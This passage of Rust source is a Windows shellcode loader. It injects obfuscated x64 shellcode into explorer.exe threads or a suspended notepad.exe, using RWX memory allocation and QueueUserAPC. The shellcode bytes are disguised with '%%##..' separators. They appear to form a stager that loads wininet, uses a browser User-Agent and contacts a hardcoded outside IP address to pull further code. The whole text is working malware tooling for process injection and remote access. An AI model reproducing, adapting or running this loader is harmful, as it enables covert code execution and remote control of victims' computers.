%##..73%%##..5a%%##..48%%##..89%%##..c1%%##..41%%##..b8%%##..5c%%##..11%%##..00%%##..00%%##..4d%%##..31%%##..c9%%##..41%%##..51%%##..41%%##..51%%##..6a%%##..03%%##..41%%##..51%%##..41%%##..ba%%##..57%%##..89%%##..9f%%##..c6%%##..ff%%##..d5%%##..eb%%##..59%%##..5b%%##..48%%##..89%%##..c1%%##..48%%##..31%%##..d2%%##..49%%##..89%%##..d8%%##..4d%%##..31%%##..c9%%##..52%%##..68%%##..00%%##..02%%##..40%%##..84%%##..52%%##..52%%##..41%%##..ba%%##..eb%%##..55%%##..2e%%##..3b%%##..ff%%##..d5%%##..48%%##..89%%##..c6%%##..48%%##..83%%##..c3%%##..50%%##..6a%%##..0a%%##..5f%%##..48%%##..89%%##..f1%%##..48%%##..89%%##..da%%##..49%%##..c7%%##..c0%%##..ff%%##..ff%%##..ff%%##..ff%%##..4d%%##..31%%##..c9%%##..52%%##..52%%##..41%%##..ba%%##..2d%%##..06%%##..18%%##..7b%%##..ff%%##..d5%%##..85%%##..c0%%##..0f%%##..85%%##..9d%%##..01%%##..00%%##..00%%##..48%%##..ff%%##..cf%%##..0f%%##..84%%##..8c%%##..01%%##..00%%##..00%%##..eb%%##..d3%%##..e9%%##..e4%%##..01%%##..00%%##..00%%##..e8%%##..a2%%##..ff%%##..ff%%##..ff%%##..2f%%##..58%%##..59%%##..32%%##..7a%%##..00%%##..9a%%##..dd%%##..af%%##..72%%##..70%%##..67%%##..7e%%##..07%%##..d1%%##..09%%##..da%%##..39%%##..83%%##..86%%##..6d%%##..74%%##..d0%%##..93%%##..f6%%##..0f%%##..63%%##..7c%%##..ba%%##..e9%%##..9d%%##..e3%%##..2d%%##..72%%##..99%%##..ae%%##..e2%%##..df%%##..04%%##..2d%%##..46%%##..da%%##..12%%##..ee%%##..0f%%##..50%%##..86%%##..c1%%##..06%%##..6a%%##..5a%%##..fd%%##..f0%%##..54%%##..41%%##..8d%%##..3e%%##..80%%##..58%%##..90%%##..6a%%##..6a%%##..7d%%##..87%%##..12%%##..ed%%##..63%%##..fa%%##..78%%##..52%%##..3b%%##..0c%%##..0f%%##..bf%%##..6a%%##..73%%##..0b%%##..9f%%##..91%%##..00%%##..55%%##..73%%##..65%%##..72%%##..2d%%##..41%%##..67%%##..65%%##..6e%%##..74%%##..3a%%##..20%%##..4d%%##..6f%%##..7a%%##..69%%##..6c%%##..6c%%##..61%%##..2f%%##..34%%##..2e%%##..30%%##..20%%##..28%%##..63%%##..6f%%##..6d%%##..70%%##..61%%##..74%%##..69%%##..62%%##..6c%%##..65%%##..3b%%##..20%%##..4d%%##..53%%##..49%%##..45%%##..20%%##..38%%##..2e%%##..30%%##..3b%%##..20%%##..57%%##..69%%##..6e%%##..64%%##..6f%%##..77%%##..73%%##..20%%##..4e%%##..54%%##..20%%##..36%%##..2e%%##..31%%##..3b%%##..20%%##..54%%##..72%%##..69%%##..64%%##..65%%##..6e%%##..74%%##..2f%%##..34%%##..2e%%##..30%%##..29%%##..0d%%##..0a%%##..00%%##..a2%%##..dc%%##..21%%##..6c%%##..a7%%##..cc%%##..0a%%##..41%%##..49%%##..31%%##..a9%%##..ae%%##..0a%%##..53%%##..a0%%##..cf%%##..08%%##..93%%##..c5%%##..ae%%##..1d%%##..b4%%##..2b%%##..12%%##..97%%##..e2%%##..92%%##..f2%%##..d4%%##..d6%%##..b8%%##..c5%%##..46%%##..d5%%##..e6%%##..48%%##..39%%##..60%%##..a9%%##..6f%%##..85%%##..a2%%##..f8%%##..5e%%##..c6%%##..ea%%##..c1%%##..ed%%##..38%%##..ac%%##..19%%##..d9%%##..ef%%##..4b%%##..4b%%##..88%%##..4d%%##..56%%##..ef%%##..2e%%##..75%%##..1e%%##..30%%##..a0%%##..46%%##..7d%%##..a5%%##..47%%##..a2%%##..a8%%##..61%%##..e4%%##..4e%%##..43%%##..66%%##..88%%##..c8%%##..7b%%##..bf%%##..d6%%##..0d%%##..03%%##..b3%%##..93%%##..bf%%##..a3%%##..20%%##..54%%##..21%%##..cf%%##..0c%%##..72%%##..37%%##..71%%##..06%%##..89%%##..78%%##..2c%%##..e3%%##..31%%##..c4%%##..2e%%##..69%%##..87%%##..3a%%##..d7%%##..2f%%##..75%%##..f2%%##..2c%%##..b3%%##..c1%%##..40%%##..66%%##..7b%%##..94%%##..94%%##..e1%%##..7c%%##..b3%%##..fc%%##..78%%##..3c%%##..6f%%##..05%%##..bd%%##..e5%%##..72%%##..3a%%##..05%%##..4b%%##..d7%%##..9e%%##..06%%##..68%%##..c5%%##..d4%%##..d3%%##..2c%%##..4b%%##..71%%##..f8%%##..8f%%##..81%%##..ae%%##..30%%##..b9%%##..6f%%##..13%%##..83%%##..79%%##..3d%%##..8c%%##..00%%##..b8%%##..59%%##..1f%%##..14%%##..b2%%##..f1%%##..dc%%##..bd%%##..42%%##..0a%%##..50%%##..24%%##..d2%%##..82%%##..a9%%##..54%%##..5f%%##..c0%%##..58%%##..3e%%##..ae%%##..b6%%##..aa%%##..97%%##..a9%%##..54%%##..90%%##..12%%##..0b%%##..05%%##..40%%##..10%%##..5f%%##..10%%##..d5%%##..f6%%##..8d%%##..e7%%##..e2%%##..d9%%##..f7%%##..77%%##..46%%##..c1%%##..d1%%##..c0%%##..51%%##..4d%%##..6e%%##..8b%%##..82%%##..9b%%##..e6%%##..2f%%##..be%%##..8e%%##..1b%%##..5c%%##..e3%%##..7f%%##..b6%%##..ac%%##..e1%%##..7f%%##..0b%%##..1e%%##..94%%##..27%%##..01%%##..58%%##..5f%%##..00%%##..41%%##..be%%##..f0%%##..b5%%##..a2%%##..56%%##..ff%%##..d5%%##..48%%##..31%%##..c9%%##..ba%%##..00%%##..00%%##..40%%##..00%%##..41%%##..b8%%##..00%%##..10%%##..00%%##..00%%##..41%%##..b9%%##..40%%##..00%%##..00%%##..00%%##..41%%##..ba%%##..58%%##..a4%%##..53%%##..e5%%##..ff%%##..d5%%##..48%%##..93%%##..53%%##..53%%##..48%%##..89%%##..e7%%##..48%%##..89%%##..f1%%##..48%%##..89%%##..da%%##..41%%##..b8%%##..00%%##..20%%##..00%%##..00%%##..49%%##..89%%##..f9%%##..41%%##..ba%%##..12%%##..96%%##..89%%##..e2%%##..ff%%##..d5%%##..48%%##..83%%##..c4%%##..20%%##..85%%##..c0%%##..74%%##..b6%%##..66%%##..8b%%##..07%%##..48%%##..01%%##..c3%%##..85%%##..c0%%##..75%%##..d7%%##..58%%##..58%%##..58%%##..48%%##..05%%##..00%%##..00%%##..00%%##..00%%##..50%%##..c3%%##..e8%%##..9f%%##..fd%%##..ff%%##..ff%%##..33%%##..39%%##..2e%%##..31%%##..30%%##..37%%##..2e%%##..32%%##..33%%##..39%%##..2e%%##..33%%##..30%%##..00%%##..12%%##..34%%##..56%%##..78");
        let mut handle =  CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD,0);
        let mut process_entry : PROCESSENTRY32 = zeroed();
        process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
        let mut thread_entry : THREADENTRY32 = zeroed();
        thread_entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
        let mut thread_ids = Vec::<u32>::new();
        let mut process_handle = null_mut();

        if !handle.is_null() {
            if Process32First(handle, &mut process_entry) == 1{
                loop {
                    let extFileName = OsString::from_wide(process_entry.szExeFile.iter().map(|&x| x as u16).collect::<Vec<u16>>().as_slice());
                    if extFileName.to_string_lossy().into_owned().starts_with("explorer.exe") {
                        process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_entry.th32ProcessID);
                        if !process_handle.is_null(){
                            if Thread32First(handle, &mut thread_entry) != 0 {
                                loop {
                                    if thread_entry.th32OwnerProcessID == process_entry.th32ProcessID {
                                        thread_ids.push(thread_entry.th32ThreadID);
                                    }
                                    if  Thread32Next(handle, &mut thread_entry) == 0 {
                                        break;
                                    }
                                    
                                }
                            }
                            break;
                        }
                    }
                    if Process32Next(handle, &mut process_entry) == 0{
                        break;
                    }
                }
            }
        }
        getPrivilege(process_handle);
        let mut base_address = std::ptr::null_mut();
        let buffer =
            // 分配虚拟内存
            NtAllocateVirtualMemory(
                GetCurrentProcess() as *mut std::ffi::c_void,
                &mut base_address as *mut *mut winapi::ctypes::c_void,
                0,
                &mut shellcode.len() as _,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );
        if  buffer == 0  {
            let mut bytes_written : PSIZE_T = null_mut();
            let status = NtWriteVirtualMemory(
                GetCurrentProcess() as *mut std::ffi::c_void,
                base_address as PVOID,
                shellcode.as_ptr() as PVOID,
                shellcode.len(), 
                bytes_written
            );
            if status != 0{
                println!("NtWriteVirtualMemory error with NTSTATUS({:?})",buffer);
            }
        }else{
            println!("NtAllocateVirtualMemory error with NTSTATUS({:?})",buffer);
        }

        let apc_func = std::mem::transmute::<*mut winapi::ctypes::c_void, Option<unsafe extern "system" fn(usize)>>(base_address);
        for thread_id in thread_ids {
            let thread_handle =  OpenThread(
                THREAD_ALL_ACCESS as u32, 
                0, 
                thread_id);
            if thread_handle == null_mut() {
                continue;
            }
            QueueUserAPC(
                apc_func, 
                thread_handle, 
                0);
            ResumeThread(thread_handle);
            // 
        std::thread::sleep(std::time::Duration::from_secs(2));
        }
    }
}


fn ApcCreateSuspend(){
    unsafe{
        let shellcode = StrToU8Array("%%##..fc%%##..48%%##..83%%##..e4%%##..f0%%##..e8%%##..c8%%##..00%%##..00%%##..00%%##..41%%##..51%%##..41%%##..50%%##..52%%##..51%%##..56%%##..48%%##..31%%##..d2%%##..65%%##..48%%##..8b%%##..52%%##..60%%##..48%%##..8b%%##..52%%##..18%%##..48%%##..8b%%##..52%%##..20%%##..48%%##..8b%%##..72%%##..50%%##..48%%##..0f%%##..b7%%##..4a%%##..4a%%##..4d%%##..31%%##..c9%%##..48%%##..31%%##..c0%%##..ac%%##..3c%%##..61%%##..7c%%##..02%%##..2c%%##..20%%##..41%%##..c1%%##..c9%%##..0d%%##..41%%##..01%%##..c1%%##..e2%%##..ed%%##..52%%##..41%%##..51%%##..48%%##..8b%%##..52%%##..20%%##..8b%%##..42%%##..3c%%##..48%%##..01%%##..d0%%##..66%%##..81%%##..78%%##..18%%##..0b%%##..02%%##..75%%##..72%%##..8b%%##..80%%##..88%%##..00%%##..00%%##..00%%##..48%%##..85%%##..c0%%##..74%%##..67%%##..48%%##..01%%##..d0%%##..50%%##..8b%%##..48%%##..18%%##..44%%##..8b%%##..40%%##..20%%##..49%%##..01%%##..d0%%##..e3%%##..56%%##..48%%##..ff%%##..c9%%##..41%%##..8b%%##..34%%##..88%%##..48%%##..01%%##..d6%%##..4d%%##..31%%##..c9%%##..48%%##..31%%##..c0%%##..ac%%##..41%%##..c1%%##..c9%%##..0d%%##..41%%##..01%%##..c1%%##..38%%##..e0%%##..75%%##..f1%%##..4c%%##..03%%##..4c%%##..24%%##..08%%##..45%%##..39%%##..d1%%##..75%%##..d8%%##..58%%##..44%%##..8b%%##..40%%##..24%%##..49%%##..01%%##..d0%%##..66%%##..41%%##..8b%%##..0c%%##..48%%##..44%%##..8b%%##..40%%##..1c%%##..49%%##..01%%##..d0%%##..41%%##..8b%%##..04%%##..88%%##..48%%##..01%%##..d0%%##..41%%##..58%%##..41%%##..58%%##..5e%%##..59%%##..5a%%##..41%%##..58%%##..41%%##..59%%##..41%%##..5a%%##..48%%##..83%%##..ec%%##..20%%##..41%%##..52%%##..ff%%##..e0%%##..58%%##..41%%##..59%%##..5a%%##..48%%##..8b%%##..12%%##..e9%%##..4f%%##..ff%%##..ff%%##..ff%%##..5d%%##..6a%%##..00%%##..49%%##..be%%##..77%%##..69%%##..6e%%##..69%%##..6e%%##..65%%##..74%%##..00%%##..41%%##..56%%##..49%%##..89%%##..e6%%##..4c%%##..89%%##..f1%%##..41%%##..ba%%##..4c%%##..77%%##..26%%##..07%%##..ff%%##..d5%%##..48%%##..31%%##..c9%%##..48%%##..31%%##..d2%%##..4d%%##..31%%##..c0%%##..4d%%##..31%%##..c9%%##..41%%##..50%%##..41%%##..50%%##..41%%##..ba%%##..3a%%##..56%%##..79%%##..a7%%##..ff%%##..d5%%##..eb%%##..73%%##..5a%%##..48%%##..89%%##..c1%%##..41%%##..b8%%##..5c%%##..11%%##..00%%##..00%%##..4d%%##..31%%##..c9%%##..41%%##..51%%##..41%%##..51%%##..6a%%##..03%%##..41%%##..51%%##..41%%##..ba%%##..57%%##..89%%##..9f%%##..c6%%##..ff%%##..d5%%##..eb%%##..59%%##..5b%%##..48%%##..89%%##..c1%%##..48%%##..31%%##..d2%%##..49%%##..89%%##..d8%%##..4d%%##..31%%##..c9%%##..52%%##..68%%##..00%%##..02%%##..40%%##..84%%##..52%%##..52%%##..41%%##..ba%%##..eb%%##..55%%##..2e%%##..3b%%##..ff%%##..d5%%##..48%%##..89%%##..c6%%##..48%%##..83%%##..c3%%##..50%%##..6a%%##..0a%%##..5f%%##..48%%##..89%%##..f1%%##..48%%##..89%%##..da%%##..49%%##..c7%%##..c0%%##..ff%%##..ff%%##..ff%%##..ff%%##..4d%%##..31%%##..c9%%##..52%%##..52%%##..41%%##..ba%%##..2d%%##..06%%##..18%%##..7b%%##..ff%%##..d5%%##..85%%##..c0%%##..0f%%##..85%%##..9d%%##..01%%##..00%%##..00%%##..48%%##..ff%%##..cf%%##..0f%%##..84%%##..8c%%##..01%%##..00%%##..00%%##..eb%%##..d3%%##..e9%%##..e4%%##..01%%##..00%%##..00%%##..e8%%##..a2%%##..ff%%##..ff%%##..ff%%##..2f%%##..58%%##..59%%##..32%%##..7a%%##..00%%##..9a%%##..dd%%##..af%%##..72%%##..70%%##..67%%##..7e%%##..07%%##..d1%%##..09%%##..da%%##..39%%##..83%%##..86%%##..6d%%##..74%%##..d0%%##..93%%##..f6%%##..0f%%##..63%%##..7c%%##..ba%%##..e9%%##..9d%%##..e3%%##..2d%%##..72%%##..99%%##..ae%%##..e2%%##..df%%##..04%%##..2d%%##..46%%##..da%%##..12%%##..ee%%##..0f%%##..50%%##..86%%##..c1%%##..06%%##..6a%%##..5a%%##..fd%%##..f0%%##..54%%##..41%%##..8d%%##..3e%%##..80%%##..58%%##..90%%##..6a%%##..6a%%##..7d%%##..87%%##..12%%##..ed%%##..63%%##..fa%%##..78%%##..52%%##..3b%%##..0c%%##..0f%%##..bf%%##..6a%%##..73%%##..0b%%##..9f%%##..91%%##..00%%##..55%%##..73%%##..65%%##..72%%##..2d%%##..41%%##..67%%##..65%%##..6e%%##..74%%##..3a%%##..20%%##..4d%%##..6f%%##..7a%%##..69%%##..6c%%##..6c%%##..61%%##..2f%%##..34%%##..2e%%##..30%%##..20%%##..28%%##..63%%##..6f%%##..6d%%##..70%%##..61%%##..74%%##..69%%##..62%%##..6c%%##..65%%##..3b%%##..20%%##..4d%%##..53%%##..49%%##..45%%##..20%%##..38%%##..2e%%##..30%%##..3b%%##..20%%##..57%%##..69%%##..6e%%##..64%%##..6f%%##..77%%##..73%%##..20%%##..4e%%##..54%%##..20%%##..36%%##..2e%%##..31%%##..3b%%##..20%%##..54%%##..72%%##..69%%##..64%%##..65%%##..6e%%##..74%%##..2f%%##..34%%##..2e%%##..30%%##..29%%##..0d%%##..0a%%##..00%%##..a2%%##..dc%%##..21%%##..6c%%##..a7%%##..cc%%##..0a%%##..41%%##..49%%##..31%%##..a9%%##..ae%%##..0a%%##..53%%##..a0%%##..cf%%##..08%%##..93%%##..c5%%##..ae%%##..1d%%##..b4%%##..2b%%##..12%%##..97%%##..e2%%##..92%%##..f2%%##..d4%%##..d6%%##..b8%%##..c5%%##..46%%##..d5%%##..e6%%##..48%%##..39%%##..60%%##..a9%%##..6f%%##..85%%##..a2%%##..f8%%##..5e%%##..c6%%##..ea%%##..c1%%##..ed%%##..38%%##..ac%%##..19%%##..d9%%##..ef%%##..4b%%##..4b%%##..88%%##..4d%%##..56%%##..ef%%##..2e%%##..75%%##..1e%%##..30%%##..a0%%##..46%%##..7d%%##..a5%%##..47%%##..a2%%##..a8%%##..61%%##..e4%%##..4e%%##..43%%##..66%%##..88%%##..c8%%##..7b%%##..bf%%##..d6%%##..0d%%##..03%%##..b3%%##..93%%##..bf%%##..a3%%##..20%%##..54%%##..21%%##..cf%%##..0c%%##..72%%##..37%%##..71%%##..06%%##..89%%##..78%%##..2c%%##..e3%%##..31%%##..c4%%##..2e%%##..69%%##..87%%##..3a%%##..d7%%##..2f%%##..75%%##..f2%%##..2c%%##..b3%%##..c1%%##..40%%##..66%%##..7b%%##..94%%##..94%%##..e1%%##..7c%%##..b3%%##..fc%%##..78%%##..3c%%##..6f%%##..05%%##..bd%%##..e5%%##..72%%##..3a%%##..05%%##..4b%%##..d7%%##..9e%%##..06%%##..68%%##..c5%%##..d4%%##..d3%%##..2c%%##..4b%%##..71%%##..f8%%##..8f%%##..81%%##..ae%%##..30%%##..b9%%##..6f%%##..13%%##..83%%##..79%%##..3d%%##..8c%%##..00%%##..b8%%##..59%%##..1f%%##..14%%##..b2%%##..f1%%##..dc%%##..bd%%##..42%%##..0a%%##..50%%##..24%%##..d2%%##..82%%##..a9%%##..54%%##..5f%%##..c0%%##..58%%##..3e%%##..ae%%##..b6%%##..aa%%##..97%%##..a9%%##..54%%##..90%%##..12%%##..0b%%##..05%%##..40%%##..10%%##..5f%%##..10%%##..d5%%##..f6%%##..8d%%##..e7%%##..e2%%##..d9%%##..f7%%##..77%%##..46%%##..c1%%##..d1%%##..c0%%##..51%%##..4d%%##..6e%%##..8b%%##..82%%##..9b%%##..e6%%##..2f%%##..be%%##..8e%%##..1b%%##..5c%%##..e3%%##..7f%%##..b6%%##..ac%%##..e1%%##..7f%%##..0b%%##..1e%%##..94%%##..27%%##..01%%##..58%%##..5f%%##..00%%##..41%%##..be%%##..f0%%##..b5%%##..a2%%##..56%%##..ff%%##..d5%%##..48%%##..31%%##..c9%%##..ba%%##..00%%##..00%%##..40%%##..00%%##..41%%##..b8%%##..00%%##..10%%##..00%%##..00%%##..41%%##..b9%%##..40%%##..00%%##..00%%##..00%%##..41%%##..ba%%##..58%%##..a4%%##..53%%##..e5%%##..ff%%##..d5%%##..48%%##..93%%##..53%%##..53%%##..48%%##..89%%##..e7%%##..48%%##..89%%##..f1%%##..48%%##..89%%##..da%%##..41%%##..b8%%##..00%%##..20%%##..00%%##..00%%##..49%%##..89%%##..f9%%##..41%%##..ba%%##..12%%##..96%%##..89%%##..e2%%##..ff%%##..d5%%##..48%%##..83%%##..c4%%##..20%%##..85%%##..c0%%##..74%%##..b6%%##..66%%##..8b%%##..07%%##..48%%##..01%%##..c3%%##..85%%##..c0%%##..75%%##..d7%%##..58%%##..58%%##..58%%##..48%%##..05%%##..00%%##..00%%##..00%%##..00%%##..50%%##..c3%%##..e8%%##..9f%%##..fd%%##..ff%%##..ff%%##..33%%##..39%%##..2e%%##..31%%##..30%%##..37%%##..2e%%##..32%%##..33%%##..39%%##..2e%%##..33%%##..30%%##..00%%##..12%%##..34%%##..56%%##..78");
        let mut si: STARTUPINFOA =zeroed() ;
        si.cb = size_of::<STARTUPINFOA>() as u32;
    
        let mut pi: PROCESS_INFORMATION = zeroed() ;
    
        let app_path = CString::new("C:\\Windows\\System32\\notepad.exe").unwrap();
    
        let create_proc_result = CreateProcessA(
                app_path.as_ptr(),
                null_mut(),
                null_mut(),
                null_mut(),
                false as i32,
                CREATE_SUSPENDED,
                null_mut(),
                null_mut(),
                &mut si,
                &mut pi
            );
        println!("{:?}",create_proc_result);
        let victim_process_handle = pi.hProcess;
        let victim_thread_handle = pi.hThread;    
        getPrivilege(victim_process_handle);
        let mut base_address = std::ptr::null_mut();
        let buffer =
            // 分配虚拟内存
            NtAllocateVirtualMemory(
                victim_process_handle as *mut std::ffi::c_void,
                &mut base_address as *mut *mut winapi::ctypes::c_void,
                0,
                &mut shellcode.len() as _,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );
        if  buffer == 0  {
            let mut bytes_written : PSIZE_T = null_mut();
            let status = NtWriteVirtualMemory(
                victim_process_handle as *mut std::ffi::c_void,
                base_address as PVOID,
                shellcode.as_ptr() as PVOID,
                shellcode.len(), 
                bytes_written
            );
            if status != 0{
                println!("NtWriteVirtualMemory error with NTSTATUS({:?})",buffer);
            }
        }else{
            println!("NtAllocateVirtualMemory error with NTSTATUS({:?})",buffer);
        }
        let apc_func = std::mem::transmute::<*mut winapi::ctypes::c_void, Option<unsafe extern "system" fn(usize)>>(base_address);
        QueueUserAPC(
            apc_func, 
            victim_thread_handle, 
            0);
        ResumeThread(victim_thread_handle);
    }
}
fn main(){
    // ApcThreadCreate();
    ApcCreateSuspend();
    // unsafe {NtTestAlert();}
    // notepadCreateThread();
}